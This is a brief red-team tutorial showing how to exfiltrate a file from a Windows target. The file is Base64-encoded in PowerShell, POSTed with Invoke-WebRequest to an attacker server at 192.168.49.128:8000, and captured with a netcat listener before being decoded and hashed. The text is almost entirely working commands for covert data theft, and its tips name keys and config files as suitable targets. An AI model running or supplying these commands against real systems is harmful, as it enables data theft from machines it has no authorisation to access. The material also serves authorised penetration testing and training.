
This method is useful when you can’t upload files directly but can **send data as text** (like through HTTP POST requests). It’s great for **stealthy exfiltration** during red team operations or restricted environments.

---

## **1. Encode the File (Target Machine)**

Convert the file to Base64:

```powershell
$b64 = [System.Convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```

This creates a Base64 string from the `hosts` file and stores it in `$b64`.

---

## **2. Send the Base64 Data via HTTP (Target Machine)**

Send the encoded data to your attacker server:

```powershell
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

---

## **3. Listen for the Data (Attacker Machine)**

Use Netcat to capture the POST request:

```bash
nc -lvnp 8000
```

When the target sends the data, you’ll see something like:

```
POST / HTTP/1.1
User-Agent: Mozilla/5.0
Content-Length: 1820

<base64 string here>
```

---

## **4. Decode the Base64 (Attacker Machine)**

Copy the Base64 string and decode it back to the original file:

```bash
echo <base64_string> | base64 -d -w 0 > hosts
```

---

## **5. Verify the File Integrity**

Check the hash to confirm the file matches the original:

```bash
md5sum hosts
```

---

## **Tips**

- This method is best for **small files** like keys, scripts, or config files.
    
- For large files, consider chunking the Base64 string into smaller parts.
    
- Use HTTPS for secure exfiltration to avoid sending sensitive data in plaintext.
    